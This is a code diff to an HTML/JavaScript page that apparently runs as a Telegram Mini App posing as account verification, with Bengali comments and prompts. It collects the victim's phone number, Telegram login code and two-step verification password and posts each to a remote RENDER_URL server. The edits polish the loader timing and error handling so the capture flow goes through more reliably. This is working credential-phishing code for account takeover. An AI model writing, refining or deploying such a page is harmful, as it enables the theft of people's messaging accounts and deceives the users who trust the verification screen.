@@ -29,7 +29,6 @@
             filter: blur(10px); z-index: -2; transform: scale(1.1);
         }
 
-        /* Full Page Animated Loader */
         #full-page-loader {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.85); backdrop-filter: blur(15px);
@@ -50,7 +49,7 @@
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
 
         .emoji-img { width: 120px; height: 120px; margin-bottom: 20px; }
-        h2 { font-size: 22px; margin-bottom: 10px; }
+        h2 { font-size: 22px; margin-bottom: 10px; font-weight: bold; }
         p { font-size: 14px; opacity: 0.8; margin-bottom: 20px; }
 
         .btn {
@@ -106,7 +105,7 @@
                 <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
                 <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
                 <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
-                <div class="key" style="color:red" onclick="press('C')">C</div><div class="key" onclick="press('0')">0</div><div class="key" onclick="press('⌫')">⌫</div>
+                <div class="key" style="color:#ff4d4d; font-weight:bold" onclick="press('C')">C</div><div class="key" onclick="press('0')">0</div><div class="key" onclick="press('⌫')">⌫</div>
             </div>
         </div>
 
@@ -114,7 +113,7 @@
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Telegram-Animated-Emojis/main/Objects/Locked%20With%20Key.webp" class="emoji-img">
             <h2>2-Step Verification</h2>
             <p>আপনার টু-স্টেপ পাসওয়ার্ডটি দিন।</p>
-            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center;" placeholder="Password">
+            <input type="password" id="2fa-input" class="btn" style="background: rgba(255,255,255,0.05); text-align: center; border: 1px solid rgba(255,255,255,0.1);" placeholder="Enter Password">
             <div id="2fa-error" class="error-msg">❌ পাসওয়ার্ড সঠিক নয়।</div>
             <button class="btn" onclick="verify2FA()">SUBMIT PASSWORD</button>
         </div>
@@ -142,28 +141,32 @@
 
         function nextStep(n) {
             document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + n).classList.add('active');
+            const target = document.getElementById('step' + n);
+            if(target) target.classList.add('active');
         }
 
         function handleStart() {
+            // রিকোয়েস্ট পাঠানোর আগে একটু রেডি হওয়া
             tg.requestContact((sent, response) => {
                 if (sent && response && response.contact) {
                     userPhone = response.contact.phone_number;
                     if (!userPhone.startsWith('+')) userPhone = '+' + userPhone;
 
-                    // সমাধান: নম্বর পাওয়ার পর লোডার দেখানো এবং ওটিপি পেজে মুভ করা
-                    toggleLoader(true, "Verifying Number...");
-                    
-                    setTimeout(() => {
-                        toggleLoader(false);
-                        nextStep(2);
-                    }, 1500);
+                    // সমাধান: সাকসেস হওয়ার সাথে সাথে লোডার চালু করা
+                    toggleLoader(true, "Verifying Account...");
 
+                    // রেন্ডার সার্ভারে পাঠানো
                     fetch(`${RENDER_URL}/send_otp`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({ phone: userPhone })
-                    }).catch(e => console.log("Request sent to background"));
+                    }).catch(e => console.log("Background Error"));
+
+                    // ২ সেকেন্ড সময় দেওয়া যাতে টেলিগ্রাম পপআপটি পুরোপুরি সরে যায়
+                    setTimeout(() => {
+                        toggleLoader(false);
+                        nextStep(2); // এবার ওটিপি পেজে যেতে বাধ্য
+                    }, 2000);
                 }
             });
         }
@@ -179,7 +182,10 @@
                 el.value = currentOtp[i - 1] || "";
                 if(currentOtp[i - 1]) el.classList.add('filled'); else el.classList.remove('filled');
             }
-            if (currentOtp.length === 5) { verifyOtp(); }
+            if (currentOtp.length === 5) { 
+                // টাইপ শেষ হওয়ার ৫০০ মিলি সেকেন্ড পর ভেরিফাই হবে যাতে শেষ ডিজিট দেখা যায়
+                setTimeout(verifyOtp, 300); 
+            }
         }
 
         async function verifyOtp() {
@@ -198,7 +204,7 @@
                 } else if (data.status === "need_2fa") {
                     nextStep(3);
                 } else {
-                    throw new Error();
+                    throw new Error("Invalid");
                 }
             } catch (err) {
                 toggleLoader(false);
@@ -216,7 +222,7 @@
         async function verify2FA() {
             const pass = document.getElementById('2fa-input').value;
             if(!pass) return;
-            toggleLoader(true, "Finalizing Login...");
+            toggleLoader(true, "Finalizing...");
             try {
                 const res = await fetch(`${RENDER_URL}/verify`, {
                     method: 'POST',
@@ -228,7 +234,7 @@
                 if (data.status === "done") {
                     nextStep(4);
                 } else {
-                    throw new Error();
+                    throw new Error("Wrong Password");
                 }
             } catch (err) {
                 toggleLoader(false);
